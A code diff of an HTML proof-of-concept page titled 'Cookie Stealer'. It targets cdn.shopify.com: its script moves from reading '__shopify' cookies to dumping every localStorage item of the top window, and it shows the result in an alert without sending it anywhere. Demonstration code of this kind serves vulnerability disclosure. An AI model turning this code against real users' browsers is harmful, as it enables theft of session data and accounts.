@@ -3,31 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Stealer2</title>
+    <title>Cookie Stealer</title>
 </head>
 <body>
     <script>
-        // Function to retrieve and display cookies from cdn.shopify.com
-        function displayShopifyCookies() {
-            // Access the top window's document to get cookies
+        // Function to retrieve and display localStorage from cdn.shopify.com
+        function displayShopifyLocalStorage() {
             try {
                 const topWindow = window.top;
-                const shopifyCookies = topWindow.document.cookie;
+                const shopifyLocalStorage = topWindow.localStorage;
 
-                // Filter cookies to only include those from cdn.shopify.com
-                const shopifyCookieArray = shopifyCookies.split(';').filter(cookie => cookie.trim().startsWith('__shopify'));
-                const shopifyCookiesString = shopifyCookieArray.join('; ');
+                // Retrieve all items from localStorage
+                const shopifyLocalStorageItems = {};
+                for (let i = 0; i < shopifyLocalStorage.length; i++) {
+                    const key = shopifyLocalStorage.key(i);
+                    const value = shopifyLocalStorage.getItem(key);
+                    shopifyLocalStorageItems[key] = value;
+                }
 
-                alert('Shopify Cookies: ' + shopifyCookiesString);
+                alert('Shopify localStorage: ' + JSON.stringify(shopifyLocalStorageItems));
             } catch (e) {
-                console.error('Error accessing cookies:', e);
-                alert('Error accessing cookies: ' + e.message);
+                console.error('Error accessing localStorage:', e);
+                alert('Error accessing localStorage: ' + e.message);
             }
         }
 
-        // Call the function to display Shopify cookies
-        displayShopifyCookies();
+        // Call the function to display Shopify localStorage
+        displayShopifyLocalStorage();
     </script>
 </body>
 </html>
-```__
